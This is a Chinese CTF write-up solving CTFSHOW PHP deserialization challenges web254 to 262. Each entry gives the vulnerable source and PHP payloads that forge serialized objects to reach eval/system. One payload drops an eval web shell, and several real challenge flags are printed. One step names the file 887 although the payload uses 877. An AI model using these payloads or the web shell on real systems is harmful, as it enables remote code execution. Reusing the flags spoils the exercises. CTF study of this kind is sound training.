## CTFSHOW-PHP反序列化

[TOC]

### web254

题目如下：
```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

Payload--->

```php
?username=xxxxxx&password=xxxxxx
```

### web255

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

payload:

> 这里注意cookie要编码，并且get传参xxxxxx

```(空)
error_reporting(0);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;

}
$a = new ctfShowUser();
echo urlencode(serialize($a));
```



### web256

```(空)
```







### web257

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}

```

----> 

Payload

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=true;
    private $class;

    public function __construct($class){
        $this->class=$class;
    }  
}

class backDoor{
    private $code = "system('tac flag.php');";
    public function getInfo(){
        eval($this->code);
    }
}


$a = new ctfShowUser(new backDoor());
echo urlencode(serialize($a));
```





### web258

ctfshow{c6e49b3c-a818-497b-b9de-c379749d95da}

过滤了 `O:数字:` `C:数字:` 的形式,

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
    public $class = 'backDoor';
}

class backDoor{
    public $code='system("ls");';
    public function getInfo(){
        eval($this->code);
    }
}
$a = new ctfShowUser();
echo serialize($a);
```

这里要处理一下结果,在数字前面加上`+`号

```php
<?php
$content = 'O:+11:"ctfShowUser":4:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;s:5:"class";O:+8:"backDoor":1:{s:4:"code";s:13:"system("ls");";}}';
echo urlencode($content);

O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7D
```



修改code ---> system("tac flag.php")

得到flag





### web260

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

简单的反序列化一段话

```php
$content = '/ctfshow_i_love_36D/';
echo serialize($content);

# s:20:"/ctfshow_i_love_36D/";
```

ctfshow{2c88afa4-d4c4-4bb1-99c0-9dcd02288990}



### web261

ctfshow{bc7b511a-1a9f-4ca3-b0b5-b0ebdcd0aed8}

题目如下：
```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']); 
```

> 当 `__wakeup()` 和 `__unserialize()` 同时存在时, 仅会执行 `__unserialize()` 方法
>
> 这里需要进行`==`比较，所以文件名命名为887

Payload

```php
<?php
class ctfshowvip
{
    public $username='877.php';
    public $password='<?php eval($_REQUEST[1]);?>';
    public $code;
}
$a = new ctfshowvip();
echo serialize($a);

#O:10:"ctfshowvip":3:{s:8:"username";s:7:"877.php";s:8:"password";s:27:"<?php eval($_REQUEST[1]);?>";s:4:"code";N;}
```

可以中国蚁剑直接连，也可以访问执行

![image-20241220142123183](https://gitee.com/bx33661/image/raw/master/path/image-20241220142123183.png)



### web262

```php
<?php
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

看到注释还有有一个`message`文件

```php
<?php
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

这道题没什么难度，简单的逻辑

```php
<?php
error_reporting(0);
class message
{
    public $token = 'admin';
}

$a = new message();
echo base64_encode(serialize($a));
//Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9
```

设置cookie就好



### web263

